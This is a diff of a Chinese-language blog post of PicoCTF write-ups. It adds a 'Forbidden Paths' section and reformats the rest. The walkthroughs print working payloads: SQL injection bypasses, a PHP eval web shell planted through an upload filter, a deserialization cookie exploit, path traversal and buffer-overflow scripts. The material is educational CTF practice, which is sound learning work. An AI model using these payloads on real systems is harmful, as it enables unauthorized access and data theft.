@@ -1,17 +1,16 @@
 ---
-title: All-in-One PicoCTF Writeups
-categories:
-    - CTF
-mathjax: true
-cover: >-
-    https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png
-tags:
-    - PicoCTF
-    - 資安
 abbrlink: 4f98706e
-date: 2024-06-01 10:27:03
+categories:
+- CTF
+cover: https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png
+date: '2024-06-01T10:27:03+08:00'
+mathjax: true
+tags:
+- PicoCTF
+- 資安
+title: All-in-One PicoCTF Writeups
+updated: '2024-08-29T02:40:49.832+08:00'
 ---
-
 # 前言
 
 其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言 XD。
@@ -26,7 +25,7 @@ date: 2024-06-01 10:27:03
 
 ![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701091116470.png)
 
-既然他說了我們瀏覽器已經收到 flag 了，就打開 F12 看一下網頁代碼吧！點開開發者工具後，直接在 Element 的 Tab 裡面用`Ctrl+F`搜尋`picoCTF`字串，結果就直接找到了 XD。欸不是這題也太水了吧！
+既然他說了我們瀏覽器已經收到 flag 了，就打開 F12 看一下網頁代碼吧！點開開發者工具後，直接在 Element 的 Tab 裡面用 `Ctrl+F`搜尋 `picoCTF`字串，結果就直接找到了 XD。欸不是這題也太水了吧！
 
 ![利用開發者工具搜尋flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701091535175.png)
 
@@ -69,7 +68,7 @@ picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}
 
 ![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701092406670.png)
 
-我們先嘗試用`admin, admin`登入看看。
+我們先嘗試用 `admin, admin`登入看看。
 
 ![Login as admin](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701092632509.png)
 
@@ -79,11 +78,11 @@ picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}
 SELECT * FROM users WHERE name='admin' AND password='admin'
 ```
 
-所以我們就可以很輕鬆的用 SQL Injection 啦！這邊使用帳號`' OR 1=1--`登入就可以啦，密碼不用輸入，或是隨便輸入也行。
+所以我們就可以很輕鬆的用 SQL Injection 啦！這邊使用帳號 `' OR 1=1--`登入就可以啦，密碼不用輸入，或是隨便輸入也行。
 
 ![Logged in](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701093002857.png)
 
-但是他說 flag 在 plainsight 裡面所以我們看不見，那就打開開發者工具用`Ctrl+F`搜尋吧！
+但是他說 flag 在 plainsight 裡面所以我們看不見，那就打開開發者工具用 `Ctrl+F`搜尋吧！
 
 ![flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701093133835.png)
 
@@ -97,7 +96,7 @@ picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
 
 ![題目](https://hackmd.io/_uploads/BySNOmYUC.png)
 
-然後我們先嘗試使用`admin`作為帳號密碼登入。帳號密碼都輸入`admin`後按下登入，網頁會渲染一個我們剛剛輸入的帳號密碼，以及後台的使用者資訊的查詢語句，如下。
+然後我們先嘗試使用 `admin`作為帳號密碼登入。帳號密碼都輸入 `admin`後按下登入，網頁會渲染一個我們剛剛輸入的帳號密碼，以及後台的使用者資訊的查詢語句，如下。
 
 ![](https://hackmd.io/_uploads/r1wnu7KIR.png)
 
@@ -109,13 +108,13 @@ password: admin
 SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
 ```
 
-所以我們在這邊把密碼用`'OR 1=1 --`這串 payload 作為輸入（帳號可以隨便輸入），整個 SQL 的 query 就會變成這樣:
+所以我們在這邊把密碼用 `'OR 1=1 --`這串 payload 作為輸入（帳號可以隨便輸入），整個 SQL 的 query 就會變成這樣:
 
 ```sql=
 SELECT id FROM users WHERE password = ''OR 1=1 --' AND username = 'admin'
 ```
 
-可以從上面的代碼高亮的顏色發現，在`1=1`後面的東西都被註解掉了，所以就可以直接登入系統啦！登入後會看到以下的介面:
+可以從上面的代碼高亮的顏色發現，在 `1=1`後面的東西都被註解掉了，所以就可以直接登入系統啦！登入後會看到以下的介面:
 
 ![](https://hackmd.io/_uploads/rJjw6XYUC.png)
 
@@ -125,9 +124,9 @@ SELECT id FROM users WHERE password = ''OR 1=1 --' AND username = 'admin'
 SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '';
 ```
 
-再來因為題目有告訴我們系統使用的是 SQLite，所以會有一個叫做`sqlite_master`的表來儲存一些表格的各種資訊。（[資訊來源](https://blog.csdn.net/luoshabugui/article/details/108327936)）
+再來因為題目有告訴我們系統使用的是 SQLite，所以會有一個叫做 `sqlite_master`的表來儲存一些表格的各種資訊。（[資訊來源](https://blog.csdn.net/luoshabugui/article/details/108327936)）
 
-知道這些候我們輸入`' UNION SELECT name, sql, 1337 FROM sqlite_master; --`讓整個 SQL 語句變成如下
+知道這些候我們輸入 `' UNION SELECT name, sql, 1337 FROM sqlite_master; --`讓整個 SQL 語句變成如下
 
 ```sql=
 SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '' UNION SELECT name, sql, 1337 FROM sqlite_master; --';
@@ -137,7 +136,7 @@ SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '' UNION SELECT name,
 
 ![找到flag所在的表格了](https://hackmd.io/_uploads/BysgmNY8R.png)
 
-我們可以看到被紅色框框圈住的地方就是我們所想獲得的 flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段 payload`' UNION SELECT 1, flag, 1 FROM more_table; --`。輸入後就可以看到以下的介面啦！
+我們可以看到被紅色框框圈住的地方就是我們所想獲得的 flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段 payload `' UNION SELECT 1, flag, 1 FROM more_table; --`。輸入後就可以看到以下的介面啦！
 
 ![flag](https://hackmd.io/_uploads/SyoSNNtLA.png)
 
@@ -172,9 +171,9 @@ Allow users to upload PNG images
 after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
 ```
 
-所以我們知道後端驗證檔案是否為 png 的方法有二，其一為檢查文件後綴名是否為`.png`；其二為驗證文件的 magic bytes，看文件在十六進制中的前幾個位元組是否為`50 4E 47`。
+所以我們知道後端驗證檔案是否為 png 的方法有二，其一為檢查文件後綴名是否為 `.png`；其二為驗證文件的 magic bytes，看文件在十六進制中的前幾個位元組是否為 `50 4E 47`。
 
-知道了這些信息後，我們先隨便找一張 png 圖片上傳看看吧！（我這邊直接隨便截圖，並命名為`hack.png`）。並且在 upload 的過程中用 Burp suite 去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為`hack.png.php`，並在檔案內容的 PNG 以下添加這個[php 一句話木馬](https://xz.aliyun.com/t/6957?time__1311=n4%2BxnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&alichlgref=https%3A%2F%2Fwww.google.com%2F)
+知道了這些信息後，我們先隨便找一張 png 圖片上傳看看吧！（我這邊直接隨便截圖，並命名為 `hack.png`）。並且在 upload 的過程中用 Burp suite 去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為 `hack.png.php`，並在檔案內容的 PNG 以下添加這個[php 一句話木馬](https://xz.aliyun.com/t/6957?time__1311=n4%2BxnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&alichlgref=https%3A%2F%2Fwww.google.com%2F)
 
 ```php=
 <?php @eval($_POST['shell']);?>
@@ -184,13 +183,13 @@ after validation, store the uploaded files so that the admin can retrieve them l
 
 ![一句話木馬](https://hackmd.io/_uploads/Sy7rFrYU0.png)
 
-上傳完成後，現在這個 shell 就會位於`https://my_instance_url/uploads/hack.png.php`這個位置上啦。
+上傳完成後，現在這個 shell 就會位於 `https://my_instance_url/uploads/hack.png.php`這個位置上啦。
 
 接下來再用[中國蟻劍](https://github.com/AntSwordProject/antSword)這款工具去連接那個 web shell 就可以啦，連接過程如下:
 
 ![輸入連接資訊](https://hackmd.io/_uploads/HJo4cSF8A.png)
 
-連接完成後，就可以直接看一下網站的文件，看到以下這個`.txt`應該就是 flag 了。
+連接完成後，就可以直接看一下網站的文件，看到以下這個 `.txt`應該就是 flag 了。
 
 ![貌似是flag的文件](https://hackmd.io/_uploads/SyahqSYLR.png)
 
@@ -202,14 +201,14 @@ after validation, store the uploaded files so that the admin can retrieve them l
 picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
 ```
 
-這邊補充一個知識點，來講一下`<?php @eval($_POST['shell']);?>`到底是在做啥。但因為我也不是很熟 php，所以我們來看看 ChatGPT 大神是怎麼回答的吧！
+這邊補充一個知識點，來講一下 `<?php @eval($_POST['shell']);?>`到底是在做啥。但因為我也不是很熟 php，所以我們來看看 ChatGPT 大神是怎麼回答的吧！
 
 > 當然，這段 PHP 代碼的原理是允許遠程執行伺服器上的 PHP 代碼。這是如何工作的：
 >
-> 1.  `<?php` 是 PHP 代碼的開始標記。
-> 2.  `@eval($_POST['shell']);` 中的 `eval()` 函數執行傳遞給它的字符串作為 PHP 代碼。這裡的代碼來自於 HTTP POST 請求中名為 `shell` 的變量。
-> 3.  `@` 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。
-> 4.  由於這段代碼執行任意 PHP 代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。
+> 1. `<?php` 是 PHP 代碼的開始標記。
+> 2. `@eval($_POST['shell']);` 中的 `eval()` 函數執行傳遞給它的字符串作為 PHP 代碼。這裡的代碼來自於 HTTP POST 請求中名為 `shell` 的變量。
+> 3. `@` 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。
+> 4. 由於這段代碼執行任意 PHP 代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。
 >
 > 簡言之，任何通過 `shell` 變量傳送的代碼都將被伺服器執行，這可以用於各種目的，包括但不限於數據讀取、文件操作等。
 
@@ -217,11 +216,11 @@ picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
 
 ## Super Serial
 
-這題先讀取`/robots.txt`發現它有一個禁止的路徑為`/admin.phps`，這似乎代表著它有支持`.phps`文件。所以可以到`/index.phps`裡面看它的源代碼。（`phps`為 PHP source）
+這題先讀取 `/robots.txt`發現它有一個禁止的路徑為 `/admin.phps`，這似乎代表著它有支持 `.phps`文件。所以可以到 `/index.phps`裡面看它的源代碼。（`phps`為 PHP source）
 
 ![index.phps](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704170553939.png)
 
-題目說 Flag 在`../flag`中，所以解題的思路就是要想辦法讀取到`../flag`。先把圖片上的程式碼拿出來分析一下。
+題目說 Flag 在 `../flag`中，所以解題的思路就是要想辦法讀取到 `../flag`。先把圖片上的程式碼拿出來分析一下。
 
 ```php
 <?php
@@ -243,7 +242,7 @@ if (isset($_POST["user"]) && isset($_POST["pass"])) {
 ?>
 ```
 
-由於可以透過`.phps`查看原始代碼，所以先去查看`cookie.phps`和`authentication.phps`。可以發現在`cookie.php`中有以下漏洞：
+由於可以透過 `.phps`查看原始代碼，所以先去查看 `cookie.phps`和 `authentication.phps`。可以發現在 `cookie.php`中有以下漏洞：
 
 ```php
 if (isset($_COOKIE["login"])) {
@@ -257,13 +256,13 @@ if (isset($_COOKIE["login"])) {
 }
 ```
 
-這裡的反序列化是不安全的（題目名稱也有提示是和 Serial 有關），如果反序列化失敗，進入到 catch error 裡面，就會把`$perm`輸出。在`authentication.php`裡面的`access_log`這個類中，他定義了`__toString()`就是讀取並回傳`log_file`的內容。
+這裡的反序列化是不安全的（題目名稱也有提示是和 Serial 有關），如果反序列化失敗，進入到 catch error 裡面，就會把 `$perm`輸出。在 `authentication.php`裡面的 `access_log`這個類中，他定義了 `__toString()`就是讀取並回傳 `log_file`的內容。
 
-所以我們只要建立一個`login`的 cookie，並輸入錯誤的值，就可以觸發反序列化的錯誤。下圖中我設置了`login`的值為`TEST`，成功觸發反序列化錯誤的訊息。
+所以我們只要建立一個 `login`的 cookie，並輸入錯誤的值，就可以觸發反序列化的錯誤。下圖中我設置了 `login`的值為 `TEST`，成功觸發反序列化錯誤的訊息。
 
 ![Deserialization error](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160307961.png)
 
-接著我們用[PHP Sandbox](https://onlinephp.io/)來線上寫一些 php 的程式碼。這邊會這樣寫是因為我們從`cookie.phps`中可以看到原始碼是先 URL decode 再 Base64 decode，最後才反序列化。所以整個流程就是反過來就對了。
+接著我們用[PHP Sandbox](https://onlinephp.io/)來線上寫一些 php 的程式碼。這邊會這樣寫是因為我們從 `cookie.phps`中可以看到原始碼是先 URL decode 再 Base64 decode，最後才反序列化。所以整個流程就是反過來就對了。
 
 ```php
 <?php
@@ -271,11 +270,11 @@ print(urlencode(base64_encode(serialize("TEST"))))
 ?>
 ```
 
-他這邊輸出了`czo0OiJURVNUIjs%3D`，我們把 cookie 的值修改為這個試試看，能不能正確的輸出`TEST`。
+他這邊輸出了 `czo0OiJURVNUIjs%3D`，我們把 cookie 的值修改為這個試試看，能不能正確的輸出 `TEST`。
 
 ![PoC](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160839984.png)
 
-成功！再來我們只需要 new 一個 access_log 的 class，並且把他的`$log_file`設定為`"../flag"`就可以了！Exploit 如下。
+成功！再來我們只需要 new 一個 access_log 的 class，並且把他的 `$log_file`設定為 `"../flag"`就可以了！Exploit 如下。
 
 ```php
 <?php
@@ -298,7 +297,7 @@ print(urlencode(base64_encode(serialize($payload))))
 TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
 ```
 
-這個就是我們最終的 Payload 啦，把它貼到`login`的 cookie 的 value，並重新整理頁面試試看吧。
+這個就是我們最終的 Payload 啦，把它貼到 `login`的 cookie 的 value，並重新整理頁面試試看吧。
 
 ![Pwned!](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706161944368.png)
 
@@ -308,7 +307,7 @@ picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}
 
 ## Java Code Analysis!?!
 
-這題稍微大一點，是一個電子書系統。一開始他給了一個登入介面還有一組帳密：帳號`user`，密碼`user`。除此之外，也有給源代碼。我們先來看看網頁的樣子。
+這題稍微大一點，是一個電子書系統。一開始他給了一個登入介面還有一組帳密：帳號 `user`，密碼 `user`。除此之外，也有給源代碼。我們先來看看網頁的樣子。
 
 ![Login](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704143233744.png)
 
@@ -342,15 +341,39 @@ picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}
 picoCTF{#0TP_Bypvss_SuCc3$S_e1eb16ed}
 ```
 
+## Forbidden Paths
+
+題目介紹如下：
+
+> Can you get the flag? We know that the website files live in `/usr/share/nginx/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. Can you get past the filter to read the flag?
+>
+> Additional details will be available after launching your challenge instance.
+
+把題目給的網站點開來看長這樣。
+
+![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_73025f05e72f6debf09b6484921102bd.png)
+
+測試一下上面這些 txt 檔案後後發現就是一個可以讀檔案的程式，既然題目都告訴我們這個網站專案路徑了，那就只需要回推回根目錄就可以了。因為是 `/usr/share/nginx/html/`有四層，那就回去四層前的目錄並讀取 `flag.txt`就可以了。最終Payload如下。
+
+```txt
+../../../../flag.txt
+```
+
+Flag 就跑出來啦！如下。
+
+```txt
+picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}
+```
+
 # Crypto
 
--   [My scripts & note on Github](https://github.com/CX330Blake/Crypto_Notebook)
--   [Cryptography Notebook 密碼學任督二脈](https://blog.cx330.tw/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/)
+- [My scripts & note on Github](https://github.com/CX330Blake/Crypto_Notebook)
+- [Cryptography Notebook 密碼學任督二脈](https://blog.cx330.tw/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/)
 
 ## Easy1
 
 ```txt
-    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
+A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
    +----------------------------------------------------
 A | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
 B | B C D E F G H I J K L M N O P Q R S T U V W X Y Z A
@@ -434,7 +457,7 @@ for i in range(26):
     print(f"Shift {i}: {plaintext}")
 ```
 
-跑出來的結果中，看起來是`crossingtherubicondjneoach`最合理，所以這就是 flag 了
+跑出來的結果中，看起來是 `crossingtherubicondjneoach`最合理，所以這就是 flag 了
 
 ```txt
 picoCTF{crossingtherubicondjneoach}
@@ -532,7 +555,7 @@ for key in ALPHABET:
     print(f"Decrypted flag: {b16_dec}")
 ```
 
-暴力破解後，看起來最像 Flag 的就是`et_tu?_23217b54456fb10e908b5e87c6e89156`這個了。最後自己幫它包上`picoCTF{}`提交，果然是正確的。
+暴力破解後，看起來最像 Flag 的就是 `et_tu?_23217b54456fb10e908b5e87c6e89156`這個了。最後自己幫它包上 `picoCTF{}`提交，果然是正確的。
 
 ```txt
 picoCTF{et_tu?_23217b54456fb10e908b5e87c6e89156}
@@ -558,15 +581,15 @@ picoCTF{r0tat1on_d3crypt3d_949af1a1}
 
 這題是個 RSA 加密，先來複習一下 RSA 加密裡面的流程和參數。
 
--   $\text{Find two prime numbers } p \text{ and } q$
--   $n = p \times q$
--   $\phi(n) = (p-1) \times (q-1)$
--   $e \text{ is the encryption exponent}$
--   $d = e^{-1} \mod \phi(n)$
--   $c \text{ is the encrypted message}; \quad c = m^e \mod n$
--   $m \text{ is the message}; \quad m = c^d \mod n$
--   $\text{Public key} = (e, n)$
--   $\text{Private key} = (d, n)$
+- $\text{Find two prime numbers } p \text{ and } q$
+- $n = p \times q$
+- $\phi(n) = (p-1) \times (q-1)$
+- $e \text{ is the encryption exponent}$
+- $d = e^{-1} \mod \phi(n)$
+- $c \text{ is the encrypted message}; \quad c = m^e \mod n$
+- $m \text{ is the message}; \quad m = c^d \mod n$
+- $\text{Public key} = (e, n)$
+- $\text{Private key} = (d, n)$
 
 複習完後，看一下題目的說明。
 
@@ -624,7 +647,7 @@ picoCTF{sma11_N_n0_g0od_55304594}
 
 > 可以先看過這篇 [Day 14:[離散數學]同餘（Mod）是什麼？](https://ithelp.ithome.com.tw/articles/10205727)
 
-當我們把題目給的密文拿去解密，他會說`Will not decrypt the ciphertext. Try Again`。代表題目的這支程式應該是在偵測我們輸入的是否為 Ciphertext。而我們知道
+當我們把題目給的密文拿去解密，他會說 `Will not decrypt the ciphertext. Try Again`。代表題目的這支程式應該是在偵測我們輸入的是否為 Ciphertext。而我們知道
 
 $$
 Plaintext = c^d \mod n
@@ -672,7 +695,7 @@ picoCTF{m4yb3_Th0se_m3s54g3s_4r3_difurrent_1772735}
 YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6YzRNalV3YUcxcWZRPT0nCg==
 ```
 
-因為他最後面的兩個`==`讓他看起來很像是 base64 的格式，所以就用 base64 先 Decode 一下。這邊用的是[CyberChef](https://gchq.github.io/CyberChef/)這款工具，他可以線上進行很多種的編碼解碼、加密等等。
+因為他最後面的兩個 `==`讓他看起來很像是 base64 的格式，所以就用 base64 先 Decode 一下。這邊用的是[CyberChef](https://gchq.github.io/CyberChef/)這款工具，他可以線上進行很多種的編碼解碼、加密等等。
 
 ![b64 decode](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704163439113.png)
 
@@ -725,7 +748,7 @@ This is the encrypted flag!
 What data would you like to encrypt?
 ```
 
-在這題中，我們要先閱讀他給我們的 Code。在 encrypt 函式中我們可以看到一些事情。因為題目給的 Cipher 的長度為 64，又因為他是以十六進制的方式輸出 Cipher，所以我們可以知道他用掉的`key_location`長度為 32，也就是說，我們下次在加密的時候是用第 33 位開始的 key。
+在這題中，我們要先閱讀他給我們的 Code。在 encrypt 函式中我們可以看到一些事情。因為題目給的 Cipher 的長度為 64，又因為他是以十六進制的方式輸出 Cipher，所以我們可以知道他用掉的 `key_location`長度為 32，也就是說，我們下次在加密的時候是用第 33 位開始的 key。
 
 ```python
 def encrypt(key_location):
@@ -760,11 +783,13 @@ if stop >= KEY_LEN:
         key = kf[start:] + kf[:stop]
 ```
 
-在這邊，如果我們讓`stop`和`KEY_LEN`相等，讓`stop % KEY_LEN == 0`的話，`stop`就會被設定為 0，所以我們就可以讓 one-time pad 被重複使用了！所以我們先輸入一堆沒用的字元去填充那個區間段，讓他把第一個 50000 循環結束，再進入一次循環後我們就可以得到跟題目一樣的 key 了。
+在這邊，如果我們讓 `stop`和 `KEY_LEN`相等，讓 `stop % KEY_LEN == 0`的話，`stop`就會被設定為 0，所以我們就可以讓 one-time pad 被重複使用了！所以我們先輸入一堆沒用的字元去填充那個區間段，讓他把第一個 50000 循環結束，再進入一次循環後我們就可以得到跟題目一樣的 key 了。
 
 然後因為他加密的方法是用計算 XOR 的方式，所以我們可以簡單地透過再計算一次 XOR 得到明文，如下:
 
-> $$key \oplus pt = ct$$ $$key \oplus ct = pt$$ $$pt \oplus ct = key$$
+> $$
+> key \oplus pt = ct$$ $$key \oplus ct = pt$$ $$pt \oplus ct = key
+> $$
 
 ```python
 from pwn import *
@@ -880,7 +905,7 @@ if __name__ == "__main__":
     test(message, "trudeau")
 ```
 
-由上面的代碼可以知道，它是經過了兩次的加密，一次是把明文反過來並讓其對`text_key`循環做 XOR，第二次是把第一次加密得到的東西轉 ASCII 並乘以 key 再乘以 311。
+由上面的代碼可以知道，它是經過了兩次的加密，一次是把明文反過來並讓其對 `text_key`循環做 XOR，第二次是把第一次加密得到的東西轉 ASCII 並乘以 key 再乘以 311。
 
 解密的話就反過來，先去除以 311 再除以 key（這裡為 12），得到一個半密文（semi_cipher）。接下來這個半密文要先反轉，再用它寫好的 function 去做 XOR（因為它的 function 裡面又有一次反轉，所以這樣剛好會是和加密時相同的順序），最後得到的這個明文還要再反轉一次，才會得到正確的 flag。至於為甚麼要反轉兩次，解釋如下：
 
@@ -1036,7 +1061,7 @@ picoCTF{n33d_a_lArg3r_e_d0cd6eae}
 
 ## b00tl3gRSA2
 
-這題給了一個 Netcat 連接方式`nc jupiter.challenges.picoctf.org 57464`。先連進去主機看看吧。連進去後可以得到公鑰（e, n）跟密文 C。
+這題給了一個 Netcat 連接方式 `nc jupiter.challenges.picoctf.org 57464`。先連進去主機看看吧。連進去後可以得到公鑰（e, n）跟密文 C。
 
 ```txt
 c: 34445152657892770965998909208982810010756495888304322276986171688963957553047312382212965383503534206383273951160130679579064667281298014647933151624988393675732505770685953145935008017740630822545491396331269103186466894080672218590474311310524848042116230603776754439341606635542489964403857509012413327600
@@ -1050,11 +1075,11 @@ e: 37080866881034431981182406871995949206609767233841813908107646836499839869322
 
 意思是在這題裡面他把 $d$ 和 $e$ 互換了，用 $d$ 來加密 $e$。下面這篇文章有詳細說了為甚麼不應該使用這種做法。
 
--   [RSA: Does it matter if you use e or d to encrypt?](https://crypto.stackexchange.com/questions/54557/rsa-does-it-matter-if-you-use-e-or-d-to-encrypt)
+- [RSA: Does it matter if you use e or d to encrypt?](https://crypto.stackexchange.com/questions/54557/rsa-does-it-matter-if-you-use-e-or-d-to-encrypt)
 
 簡而言之，當私鑰指數（$d$）比較小的時候，可以使用[Wiener's attack](https://en.wikipedia.org/wiki/Wiener%27s_attack)。這邊可以使用一個開源工具來幫助我們快速執行攻擊。
 
--   [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)
+- [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)
 
 使用方式請查看官方文檔。總之 Exploit 如下。
 
@@ -1111,7 +1136,7 @@ m = pow(c, d, n)
 print(long_to_bytes(m))
 ```
 
-這邊的`get_phi(n)`是用到了以下的求歐拉函數的公式：
+這邊的 `get_phi(n)`是用到了以下的求歐拉函數的公式：
 
 $\phi(n) = p_1^{k_1 - 1} \times (p_1 - 1) \times p_2^{k_2 - 1} \times (p_2 - 1) \times \cdots \times p_m^{k_m - 1} \times (p_m - 1)$
 
@@ -1187,11 +1212,11 @@ int main()
 **分析代碼**
 
 1. `char input[16];`宣告了一個長度為 16 的字元陣列，儲存使用者輸入。
-2. `gets(input);`獲取使用者輸入，由於`gets`函數不檢查輸入的長度，使用者可以輸入超過 16 個字元。（[危险函数 gets()几种完美的替代方法 你可能还不知道的](https://blog.csdn.net/qq_40907279/article/details/89046366)）
-3. `int num = 64;`宣告並初始化變數`num`。
+2. `gets(input);`獲取使用者輸入，由於 `gets`函數不檢查輸入的長度，使用者可以輸入超過 16 個字元。（[危险函数 gets()几种完美的替代方法 你可能还不知道的](https://blog.csdn.net/qq_40907279/article/details/89046366)）
+3. `int num = 64;`宣告並初始化變數 `num`。
 4. 拿到 flag 的條件是要讓 num 的值為 65。
 
-這邊我們可以用`man gets`指令進入 gets 的 man 手冊頁，看一下他的 bug 區塊，了解 gets 到底危險在哪裡。
+這邊我們可以用 `man gets`指令進入 gets 的 man 手冊頁，看一下他的 bug 區塊，了解 gets 到底危險在哪裡。
 
 ![Bug of gets function](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702142351553.png)
 
@@ -1203,7 +1228,7 @@ int main()
 
 他沒有 [Canary](https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/) 也沒有 [PIE](https://ithelp.ithome.com.tw/articles/10336777)，就正常做 BOF 就可以了。
 
-因為`input`和`num`都是區域變數，所以會存在 Stack 中。並且因為是先宣告`input`緊接著宣告`num`，所以在 Stack 中會像下面這樣：
+因為 `input`和 `num`都是區域變數，所以會存在 Stack 中。並且因為是先宣告 `input`緊接著宣告 `num`，所以在 Stack 中會像下面這樣：
 
 ```txt
 High Address
@@ -1221,7 +1246,7 @@ High Address
 Low Address
 ```
 
-最後試出來的 Payload 是 24 個字元加上一個大寫的 A（因為`ord(A) == 65`），但是在這裡我有點不理解為甚麼前面是 24 個填充，猜測是`input[16]`跟`num`中間有 Padding 之類的東西。如果有人知道的話再麻煩跟我解釋一下，感謝了！總之，還是拿到 Flag 啦。
+最後試出來的 Payload 是 24 個字元加上一個大寫的 A（因為 `ord(A) == 65`），但是在這裡我有點不理解為甚麼前面是 24 個填充，猜測是 `input[16]`跟 `num`中間有 Padding 之類的東西。如果有人知道的話再麻煩跟我解釋一下，感謝了！總之，還是拿到 Flag 啦。
 
 ![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704141242017.png)
 
@@ -1286,10 +1311,10 @@ int main(int argc, char **argv)
 **分析代碼**
 
 1. Winning condition 是要觸發 Segmentation fault。
-2. `vuln`函式裡面的`buf2`宣告為 16 個字元的大小，也就是 16 個 Bytes。
-3. 當`gets`輸入的內容超過 16 個 Bytes 的時候，觸發錯誤。
+2. `vuln`函式裡面的 `buf2`宣告為 16 個字元的大小，也就是 16 個 Bytes。
+3. 當 `gets`輸入的內容超過 16 個 Bytes 的時候，觸發錯誤。
 
-這邊我們可以再來看一下除了`gets`以外的危險函式，也就是`strcpy`。（[Buffer Overflow example - strcpy](https://security.stackexchange.com/questions/202358/buffer-overflow-example-strcpy)）
+這邊我們可以再來看一下除了 `gets`以外的危險函式，也就是 `strcpy`。（[Buffer Overflow example - strcpy](https://security.stackexchange.com/questions/202358/buffer-overflow-example-strcpy)）
 
 man 手冊裡面也寫了，程式設計師要負起責任，指派一個足夠大的空間給 strcpy 的 dst（Destination）。
 
@@ -1297,7 +1322,7 @@ man 手冊裡面也寫了，程式設計師要負起責任，指派一個足夠�
 
 **BOF 攻擊**
 
-所以我們知道，在這裡只要輸入很長的字串，就會造成`strcpy`出錯，並得到 flag，那就來試試看吧！
+所以我們知道，在這裡只要輸入很長的字串，就會造成 `strcpy`出錯，並得到 flag，那就來試試看吧！
 
 ![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702150413588.png)
 
@@ -1419,7 +1444,7 @@ Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
 Found at offset 44
 ```
 
-找到他的 offset 為 44 後再看一下`win()`的地址。
+找到他的 offset 為 44 後再看一下 `win()`的地址。
 
 ```bash
 pwndbg> disass win
@@ -1472,7 +1497,7 @@ Dump of assembler code for function win:
 End of assembler dump.
 ```
 
-找到了它的地址是`0x080491f6`。那就開始構造 Exploit 吧。
+找到了它的地址是 `0x080491f6`。那就開始構造 Exploit 吧。
 
 ```python
 from pwn import *
@@ -1708,7 +1733,7 @@ picoCTF{15_y0ur_que57_qu1x071c_0r_h3r01c_ea7deb4c}
 
 ## GDB Test Drive
 
-這題的話先用`wget`把題目這個二進制檔案抓下來。
+這題的話先用 `wget`把題目這個二進制檔案抓下來。
 
 ![Wget](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701212911463.png)
 
@@ -1718,18 +1743,18 @@ picoCTF{15_y0ur_que57_qu1x071c_0r_h3r01c_ea7deb4c}
 
 這邊來稍微解釋一下每個指令的意義，他到底是做了哪些事情呢？
 
--   `chmod +x gdbme`
-    -   修改 gdbme 檔案的權限，新增執行權限（x）
--   `gdb gdbme`
-    -   使用 gdb（GNU Debugger）打開 gdbme 這個可執行檔案。
--   `layout asm`
